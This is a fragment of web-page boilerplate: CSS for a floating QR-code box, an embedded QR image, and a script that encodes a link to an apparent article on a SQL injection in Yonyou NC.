color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk\_psndoc-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 